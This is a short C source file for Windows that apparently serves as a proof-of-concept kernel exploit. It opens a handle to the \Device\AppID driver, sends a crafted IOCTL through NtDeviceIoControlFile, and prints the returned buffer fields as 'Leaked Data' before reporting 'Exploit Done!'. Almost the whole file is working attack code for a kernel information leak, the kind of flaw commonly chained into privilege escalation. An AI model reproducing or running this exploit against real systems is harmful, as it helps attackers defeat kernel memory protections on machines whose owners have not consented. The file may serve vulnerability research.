#include "Common.h"

int SendRequest(HANDLE hDevice, PVOID buffer, size_t bufferLen)
{
    IO_STATUS_BLOCK ioStatus;
    NTSTATUS status;

    status = NtDeviceIoControlFile(hDevice, NULL, NULL, NULL, &ioStatus, IOCTL, NULL, NULL, buffer, bufferLen);

    if (status == NOERROR)
    {
        return 1;
    }
    else
    {
        wprintf(L"[!] NtDeviceIoControlFile failed with 0x%X\n", status);
        return 0;
    }
}

int exploit()
{
    NTSTATUS status;
    DWORD dwBytesReturned = 0;
    HANDLE hDevice = NULL;
    UNICODE_STRING deviceName;
    OBJECT_ATTRIBUTES objAttr;
    IO_STATUS_BLOCK ioStatus;
    RtlInitUnicodeString(&deviceName, L"\\Device\\AppID");
    InitializeObjectAttributes(&objAttr, &deviceName, OBJ_CASE_INSENSITIVE, NULL, NULL, NULL);
    wprintf(L"[^] Trying to open a handle to %ws\n", deviceName.Buffer);
    status = NtCreateFile(&hDevice, GENERIC_READ | GENERIC_WRITE,
        &objAttr, &ioStatus, NULL, FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, 0, NULL, 0);

    if (status != 0)
    {
        wprintf(L"[!] Failed to open a handle to %ws (NTSTATUS code: 0x%X)\n", deviceName.Buffer, status);
        return -1;
    }

    wprintf(L"[+] Opened a handle successfully %p\n", hDevice);
    wprintf(L"[*] Sending the request to trigger the info leak\n");

    size_t OutputBufferLength = sizeof(BufferOut);
    BufferOut OutputBuffer = { 0 };

    if (SendRequest(hDevice, &OutputBuffer, OutputBufferLength))
    {
        wprintf(L"[+] Sent the request successfully\n");
    }
    else
    {
        wprintf(L"[!] Failed to send the request\n");
        return -1;
    }

    printf("[*] Leaked Data:\nfield0 -> %llx\nfield1 -> %llx\nfield2 -> %llx\nfield3 -> %llx\nfield4 -> %llx\nfiedl5 -> %llx\n",
        OutputBuffer.field0, OutputBuffer.field1, OutputBuffer.field2, OutputBuffer.field3, OutputBuffer.field4, OutputBuffer.field5);

    wprintf(L"[+] Exploit Done!\n");
    NtClose(hDevice);

    return 0;
}